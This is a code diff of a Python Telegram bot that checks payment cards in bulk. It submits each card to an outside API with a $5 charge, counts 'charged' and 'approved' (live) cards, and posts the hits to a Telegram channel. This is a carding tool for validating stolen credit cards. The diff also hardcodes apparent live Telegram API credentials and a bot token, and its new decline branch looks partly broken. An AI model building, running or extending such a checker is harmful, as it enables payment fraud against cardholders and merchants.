@@ -6,20 +6,16 @@ from telethon import TelegramClient, events, Button
 
 api_id = '27649783'
 api_hash = '834fd6015b50b781e0f8a41876ca95c8'
-
-# Replace YOUR_BOT_TOKEN with your actual Telegram bot token
 bot_token = '7386696229:AAG7k96MBOBl4hfJA7_ldUSzZC9XTDFRzhA'
 
 REQUEST_DELAY = 5
 
-client = TelegramClient('bots', api_id, api_hash).start(bot_token=bot_token)
+client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)
 
 CCN_BASE_URL = "https://ugin-376ec3a40d16.herokuapp.com/cvv"
 CVV_BASE_URL = "https://ugin-376ec3a40d16.herokuapp.com/cvv"
 
-# List to keep track of approved users
 approved_users = set()
-
 admin_ids = {7427691214}
 
 channel_id = -1002196680748
@@ -27,7 +23,6 @@ channel_id = -1002196680748
 def divide_by_100(amount):
     return amount / 100
 
-# Ensure the results directory exists
 RESULTS_DIR = '/mnt/data/results'
 os.makedirs(RESULTS_DIR, exist_ok=True)
 
@@ -110,7 +105,6 @@ async def get_declined_cards(event):
         await event.reply("Usage: /get <unique_id>")
 
 async def check_approval_and_respond(event):
-    """Check if the user is approved before proceeding."""
     if event.sender_id not in approved_users and event.sender_id not in admin_ids:
         await event.reply("You need to be approved by the admin to use this bot.")
         return False
@@ -149,7 +143,6 @@ async def ccn_check(event):
     unique_id = generate_unique_id()
     session_results[unique_id] = []
 
-    # Initialize stop event for the user
     user_stop_events[event.sender_id] = asyncio.Event()
 
     await process_card(event, CCN_BASE_URL, card_details, "𝐂𝐂𝐍", unique_id, user_counts)
@@ -175,7 +168,6 @@ async def cvv_check(event):
     unique_id = generate_unique_id()
     session_results[unique_id] = []
 
-    # Initialize stop event for the user
     user_stop_events[event.sender_id] = asyncio.Event()
 
     await process_card(event, CVV_BASE_URL, card_details, "𝐂𝐕𝐕", unique_id, user_counts)
@@ -184,7 +176,7 @@ async def cvv_check(event):
 async def stop(event):
     if event.sender_id in approved_users or event.sender_id in admin_ids:
         if event.sender_id in user_stop_events:
-            user_stop_events[event.sender_id].set()  # Set the event to stop the current process for this user
+            user_stop_events[event.sender_id].set()
             await event.reply("Stopping the current process for you...")
         else:
             await event.reply("No ongoing process found for you.")
@@ -193,7 +185,7 @@ async def stop(event):
 
 async def process_card(event, base_url, card_details, check_type, unique_id, user_counts):
     global last_card, last_card_response
-    declined_cards = []  # Define declined_cards within the function
+    declined_cards = []
     sender = await event.get_sender()
     first_name = sender.first_name
     message = await event.reply("𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐂𝐂 𝐜𝐡𝐞𝐜𝐤𝐢𝐧𝐠...")
@@ -225,110 +217,50 @@ async def process_card(event, base_url, card_details, check_type, unique_id, use
                                    f"┗━━━━━━━━━━━⊛\n"
                                    f"➩ 𝗖𝗮𝗿𝗱: `{card}`\n"
                                    f"➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: *Payment Successful!✅*\n"
-                                   f"➩ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗶𝗻𝘁𝗲𝗻𝘁 𝗜𝗗: `{response_data.get('id', '')}`\n"
-                                   f"➩ 𝗔𝗺𝗼𝘂𝗻𝘁: `{divided_amount}` `{response_data.get('currency', '')}`\n\n"
-                                   f"➩ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name}\n\n")
-                buttons = [
-                    [Button.url('𝐁𝐎𝐓 𝐁𝐘', 'tg://openmessage?user_id=7427691214'), Button.url('𝐀𝐏𝐈 𝐁𝐘', 'tg://openmessage?user_id=7427691214')]
-                ]
-                await event.reply(success_message, buttons=buttons, link_preview=False)
-                await client.send_message(channel_id, success_message, buttons=buttons, link_preview=False)
+                                   f"➩ 𝗔𝗺𝗼𝘂𝗻𝘁: `${divided_amount}`")
+                await event.client.send_message(channel_id, f"{first_name} - `{card}` - {last_card_response}")
                 user_counts['charged_cc_count'] += 1
-                session_results[unique_id].append(f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ✅: {card}")
-
             else:
-                error_data = response_data.get("error")
-                if error_data:
-                    decline_reason = error_data.get("decline_code", "")
-                    amount = error_data.get("amount", 0)
-                    divided_amount = divide_by_100(amount)
-                    message_text = error_data.get("message", "Unknown Error")
-                    currency = error_data.get("currency", "")
-                    status = error_data.get("status", "")
-
-                    if message_text == "Your card's security code is incorrect." or decline_reason in ["incorrect_cvc", "insufficient_funds", "transaction_not_allowed"]:
-                        ok_cc_message = (f"┏━━━━━━━⍟\n"
-                                         f"┃ {check_type} 𝐂𝐇𝐀𝐑𝐆𝐄 𝟓$ ✅\n"
-                                         f"┗━━━━━━━━━━━⊛\n"
-                                         f"➩ 𝗖𝗮𝗿𝗱: `{card}`\n"
-                                         f"➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: *APPROVED CARD*\n"
-                                         f"➩ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲 𝗥𝗲𝗮𝘀𝗼𝗻: `{decline_reason}`\n"
-                                         f"➩ 𝗠𝗲𝘀𝘀𝗮𝗴𝗲: `{message_text}`\n\n"
-                                         f"➩ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name}\n\n")
-                        buttons = [
-                            [Button.url('𝐁𝐎𝐓 𝐁𝐘', 'tg://openmessage?user_id=7427691214'), Button.url('𝐀𝐏𝐈 𝐁𝐘', 'tg://openmessage?user_id=7427691214')]
-                        ]
-                        await event.reply(ok_cc_message, buttons=buttons, link_preview=False)
-                        await client.send_message(channel_id, ok_cc_message, buttons=buttons, link_preview=False)
-                        user_counts['ok_cc_count'] += 1
-                        session_results[unique_id].append(f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅: {card}\n𝐑𝐞𝐚𝐬𝐨𝐧: {decline_reason}")
-                    else:
-                        last_card_response = f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌: {card}\n𝐑𝐞𝐚𝐬𝐨𝐧: {decline_reason}\n𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {message_text}"
-                        declined_cards.append((card, last_card_response))
-                        user_counts['declined_cc_count'] += 1
-                        session_results[unique_id].append(last_card_response)
-                else:
-                    decline_reason = response_data.get("decline_code", "")
-                    amount = response_data.get("amount", 0)
-                    divided_amount = divide_by_100(amount)
-                    message_text = response_data.get("message", "Unknown Error")
-                    currency = response_data.get("currency", "")
-                    status = response_data.get("status", "")
-
-                    if message_text == "Your card's security code is incorrect." or decline_reason in ["incorrect_cvc", "insufficient_funds", "transaction_not_allowed"]:
-                        ok_cc_message = (f"┏━━━━━━━⍟\n"
-                                         f"┃ {check_type} 𝐂𝐇𝐀𝐑𝐆𝐄 𝟓$ ✅\n"
-                                         f"┗━━━━━━━━━━━⊛\n"
-                                         f"➩ 𝗖𝗮𝗿𝗱: `{card}`\n"
-                                         f"➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: *APPROVED CC*\n"
-                                         f"➩ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲 𝗥𝗲𝗮𝘀𝗼𝗻:`{decline_reason}`\n"
-                                         f"➩ 𝗠𝗲𝘀𝘀𝗮𝗴𝗲: `{message_text}`\n\n"
-                                         f"➩ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name}\n\n")
-                        buttons = [
-                            [Button.url('𝐁𝐎𝐓 𝐁𝐘', 'tg://openmessage?user_id=7427691214'), Button.url('𝐀𝐏𝐈 𝐁𝐘', 'tg://openmessage?user_id=7427691214')]
-                        ]
-                        await event.reply(ok_cc_message, buttons=buttons, link_preview=False)
-                        await client.send_message(channel_id, ok_cc_message, buttons=buttons, link_preview=False)
-                        user_counts['ok_cc_count'] += 1
-                        session_results[unique_id].append(f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅: {card}\n𝐑𝐞𝐚𝐬𝐨𝐧: {decline_reason}")
-                    else:
-                        last_card_response = f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌: {card}\n𝐑𝐞𝐚𝐬𝐨𝐧: {decline_reason}\n𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {message_text}"
-                        declined_cards.append((card, last_card_response))
-                        user_counts['declined_cc_count'] += 1
-                        session_results[unique_id].append(last_card_response)
+                reason = response_data.get("error", {}).get("message", "Declined")
+                success_message = (f"┏━━━━━━━⍟\n"
+                                   f"┃ {check_type} 𝐃𝐄𝐂𝐋𝐈𝐍𝐄 ❌\n"
+                                   f"┗━━━━━━━━━━━⊛\n"
+                                   f"➩ 𝗖𝗮𝗿𝗱: `{card}`\n"
+                                   f"➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: *{reason}*")
+                declined_cards.append((card, reason))
+                user_counts['declined_cc_count'] += 1
 
             user_counts['checked_cc_count'] += 1
+            session_results[unique_id].append(f"{card} - {last_card_response}")
 
-            update_msg = (f"{last_card_response}\n"
-                          f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝐂𝐂𝐬: {user_counts['charged_cc_count']}\n"
-                          f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐂𝐂𝐬: {user_counts['ok_cc_count']}\n"
-                          f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 𝐂𝐂𝐬: {user_counts['declined_cc_count']}\n"
-                          f"𝐓𝐨𝐭𝐚𝐥 𝐂𝐂𝐬: {user_counts['checked_cc_count']}/{user_counts['total_cc_count']}\n"
-                          f"𝐆𝐞𝐭 𝐫𝐞𝐬𝐮𝐥𝐭𝐬 𝐛𝐲 /get {unique_id}")
+            update_msg = (f"**𝐒𝐭𝐚𝐭𝐮𝐬:**\n"
+                          f"┏━━━━━⍟\n"
+                          f"┣ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {user_counts['checked_cc_count']}/{user_counts['total_cc_count']}\n"
+                          f"┣ 𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {user_counts['charged_cc_count']}\n"
+                          f"┣ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {user_counts['ok_cc_count']}\n"
+                          f"┣ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {user_counts['declined_cc_count']}\n"
+                          f"┗━━━━━⍟")
+
             buttons = [
-                [Button.url('𝐁𝐎𝐓 𝐁𝐘', 'tg://openmessage?user_id=7427691214'), Button.url('𝐀𝐏𝐈 𝐁𝐘', 'tg://openmessage?user_id=7427691214')]
+                [Button.inline("Get Declined Cards", f"get_declined_{unique_id}")]
             ]
-            await message.edit(update_msg, buttons=buttons)
+
+            await message.edit(update_msg, buttons=buttons, link_preview=False)
 
         except json.JSONDecodeError:
-            last_card_response = f"Failed to decode response for {card}.\nResponse text: {response.text}"
-            declined_cards.append((card, last_card_response))
-            user_counts['declined_cc_count'] += 1
-            session_results[unique_id].append(f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌: {card}\n𝐑𝐞𝐚𝐬𝐨𝐧: {decline_reason}")
+            await event.reply(f"⚠ JSON Decode Error: Couldn't process the response for `{card}`.")
+            continue
 
-            update_msg = (f"{last_card_response}\n"
-                          f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝐂𝐂𝐬: {user_counts['charged_cc_count']}\n"
-                          f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐂𝐂𝐬: {user_counts['ok_cc_count']}\n"
-                          f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 𝐂𝐂𝐬: {user_counts['declined_cc_count']}\n"
-                          f"𝐓𝐨𝐭𝐚𝐥 𝐂𝐂𝐬: {user_counts['checked_cc_count']}/{user_counts['total_cc_count']}\n"
-                          f"𝐆𝐞𝐭 𝐫𝐞𝐬𝐮𝐥𝐭𝐬 𝐛𝐲 `/get {unique_id}`")
-            buttons = [
-                [Button.url('𝐁𝐎𝐓 𝐁𝐘', 'tg://openmessage?user_id=7427691214'), Button.url('𝐀𝐏𝐈 𝐁𝐘', 'tg://openmessage?user_id=7427691214')]
-            ]
-            await message.edit(update_msg, buttons=buttons)
+        await asyncio.sleep(REQUEST_DELAY)
 
-        await asyncio.sleep(REQUEST_DELAY)  # Delay between requests
+    if declined_cards:
+        declined_file_path = os.path.join(RESULTS_DIR, f'declined_{unique_id}.txt')
+        with open(declined_file_path, 'w') as f:
+            for card, reason in declined_cards:
+                f.write(f"{card}: {reason}\n")
+        await event.client.send_file(event.chat_id, declined_file_path, caption="Declined Cards")
+
+    await event.reply(f"Processing complete.\nYou can retrieve your results using /get {unique_id}")
 
 client.start()
 client.run_until_disconnected()
-                        
